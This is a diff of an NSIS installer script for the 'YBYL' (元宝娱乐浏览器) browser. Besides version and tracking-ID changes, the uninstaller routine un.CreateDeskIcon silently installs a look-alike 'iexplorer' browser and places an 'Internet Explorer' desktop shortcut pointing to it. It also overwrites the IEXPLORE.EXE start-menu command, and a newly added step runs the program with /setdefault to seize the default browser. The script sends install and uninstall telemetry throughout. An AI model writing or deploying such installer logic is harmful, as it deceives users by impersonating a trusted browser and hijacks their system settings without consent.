@@ -54,10 +54,10 @@ Var Bool_IsSilent
 
 !define PRODUCT_NAME "YBYL"
 !define SHORTCUT_NAME "元宝娱乐浏览器"
-!define PRODUCT_VERSION "1.0.0.17"
-!define VERSION_LASTNUMBER 17
-!define PRODUCT_VERSION_IE "8.0.0.12"
-!define VERSION_LASTNUMBER_IE 12
+!define PRODUCT_VERSION "1.0.0.20"
+!define VERSION_LASTNUMBER "B20"
+!define PRODUCT_VERSION_IE "8.0.0.15"
+!define VERSION_LASTNUMBER_IE "B15"
 
 !define NeedSpace 10240
 !define EM_OUTFILE_NAME "YBSetup-${PRODUCT_VERSION}_inner.exe"
@@ -186,7 +186,7 @@ FunctionEnd
 
 Function un.CheckBlackProcess
 	StrCpy $R0 0
-	${For} $R5 1 18
+	${For} $R5 1 28
 		${WordFind} $R4 "," +$R5 $R3
 		${If} $R3 != 0
 		${AndIf} $R3 != ""
@@ -194,6 +194,9 @@ Function un.CheckBlackProcess
 			${If} $R0 == 1
 				${Break}
 			${EndIf}
+		${ElseIf} $R3 == $R4
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::QueryProcessExist(t '$R3.exe') i.R0"
+			${Break}
 		${EndIf}
 	${Next}
 FunctionEnd
@@ -252,9 +255,12 @@ Function un.CreateDeskIcon
 	StrCpy $str_IeTID ""
 	ReadRegStr $str_IeTID HKLM "SOFTWARE\YBYL" "ietid"
 	${If} $str_IeTID == ""
-		StrCpy $str_IeTID "UA-60726208-1"
+		StrCpy $str_IeTID "UA-61921868-1"
 	${EndIf}
-	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'installiefromYBUninst', t '${VERSION_LASTNUMBER_IE}', t '$str_ChannelID', i 1, t '$str_IeTID') "
+	WriteRegStr HKCU "SOFTWARE\iexplorer" "ietid" $str_IeTID
+	
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'installiefromYBUninst', t '$str_ChannelID', t '${VERSION_LASTNUMBER_IE}', i 0, t '$str_IeTID') "
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'install', t '$str_ChannelID', t '${VERSION_LASTNUMBER_IE}', i 0, t '$str_IeTID') "
 	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "DisplayVersion" "${PRODUCT_VERSION_IE}"
 	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "URLInfoAbout" ""
 	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "Publisher" "iexplorer"
@@ -304,7 +310,6 @@ Function un.CreateDeskIcon
 	${Else}
 		Call un.CheckBlackProcess
 	${EndIf}
-	
 	;创建我们的图标
 	${If} $R0 == 1
 		CreateShortCut "$DESKTOP\Internet Explorer.lnk" "$0\iexplorer\program\iexplore.exe" "/sstartfrom desktop" "" "" "" "" "启动 Internet Explorer 浏览器"
@@ -496,6 +501,10 @@ Function un.CreateDeskIcon
 		${EndIf}
 		WriteRegStr HKLM "Software\Clients\StartMenuInternet\IEXPLORE.EXE\shell\open\command" "" '"$0\iexplorer\program\iexplore.exe"'
 	${EndIf}
+	;拉起exe抢默认浏览器
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'ExecWait $0\iexplorer\program\iexplore.exe /setdefault')"
+	ExecWait '"$0\iexplorer\program\iexplore.exe" /setdefault'
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'ExecWait leave')"
 	EndCreateDeskIcon:
 FunctionEnd
 
@@ -600,11 +609,11 @@ Function InstallIE
 	WriteRegStr HKLM "SOFTWARE\YBYL" "ietid" $str_IeTID
 	;上报
 	${If} $Bool_IsUpdateIE == 0
-		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'install', t '${VERSION_LASTNUMBER_IE}', t '$str_ChannelID', i 1, t '$str_IeTID') "
-		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'installmethod', t '${VERSION_LASTNUMBER_IE}', t '0', i 1, t '$str_IeTID') "
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'releasefile', t 'brandnew', t '$str_ChannelID', i 1, t '$str_IeTID') "
+		;System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'installmethod', t '${VERSION_LASTNUMBER_IE}', t '0', i 1, t '$str_IeTID') "
 	${Else}
-		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'update', t '${VERSION_LASTNUMBER_IE}', t '$str_ChannelID', i 1, t '$str_IeTID')"
-		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'updatemethod', t '${VERSION_LASTNUMBER_IE}', t '0', i 1, t '$str_IeTID')"
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'releasefile', t 'update', t '$str_ChannelID', i 1, t '$str_IeTID')"
+		;System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'updatemethod', t '${VERSION_LASTNUMBER_IE}', t '0', i 1, t '$str_IeTID')"
 	${EndIf}  
 
 	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'InstallIE LEAVE')"
@@ -698,15 +707,15 @@ Function DoInstall
   StrCpy $R0 $str_ChannelID
   ;是否静默安装
   ${GetOptions} $R4 "/s"  $R2
-  StrCpy $R3 "0"
+  StrCpy $R3 "silent"
   IfErrors 0 +2
-  StrCpy $R3 "1"
+  StrCpy $R3 "nosilent"
   ${If} $Bool_IsUpdate == 0
-	System::Call '$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStat(t "install", t "${VERSION_LASTNUMBER}", t "$R0", i 1) '
-	System::Call '$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStat(t "installmethod", t "${VERSION_LASTNUMBER}", t "$R3", i 1) '
+	System::Call '$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStat(t "install", t "$R0",  t "${VERSION_LASTNUMBER}", i 1) '
+	System::Call '$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStat(t "installmethod", t "$R3", t "${VERSION_LASTNUMBER}", i 1) '
   ${Else}
-	System::Call '$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStat(t "update", t "${VERSION_LASTNUMBER}", t "$R0", i 1)'
-	System::Call '$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStat(t "updatemethod", t "${VERSION_LASTNUMBER}", t "$R3", i 1)'
+	System::Call '$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStat(t "update", t "$R0", t "${VERSION_LASTNUMBER}", i 1)'
+	System::Call '$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStat(t "updatemethod", t "$R3", t "${VERSION_LASTNUMBER}", i 1)'
   ${EndIf}  
  ;写入自用的注册表信息
   WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_MAININFO_FORSELF}" "InstallSource" $str_ChannelID
@@ -931,7 +940,7 @@ Function CmdUnstall
 	
 	SetOutPath "$TEMP\${PRODUCT_NAME}"
 	IfFileExists "$TEMP\${PRODUCT_NAME}\YBSetUpHelper.dll" 0 +2
-	System::Call '$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStat(t "uninstall", t "${VERSION_LASTNUMBER}", t "$str_ChannelID", i 1) '
+	System::Call '$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStat(t "uninstall", t "$str_ChannelID", t "${VERSION_LASTNUMBER}", i 1) '
 	ReadRegStr $0 ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_MAININFO_FORSELF}" "InstDir"
 	${If} $0 == "$INSTDIR"
 		DeleteRegKey ${PRODUCT_UNINST_ROOT_KEY} "${PRODUCT_UNINST_KEY}"
@@ -2168,7 +2177,7 @@ Function un.OnClick_CruelRefused
 	EnableWindow $Btn_CruelRefused 0
 	EnableWindow $Btn_ContinueUse 0
 	IfFileExists "$TEMP\${PRODUCT_NAME}\YBSetUpHelper.dll" 0 +3
-	System::Call '$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStat(t "uninstall", t "${VERSION_LASTNUMBER}", t "$str_ChannelID", i 1) '
+	System::Call '$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStat(t "uninstall", t "$str_ChannelID", t "${VERSION_LASTNUMBER}",  i 1) '
 	${For} $R3 0 3
 		;FindProcDLL::FindProc "${PRODUCT_NAME}.exe"
 		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::QueryProcessExist(t '${PRODUCT_NAME}.exe') i.R0 ?e"
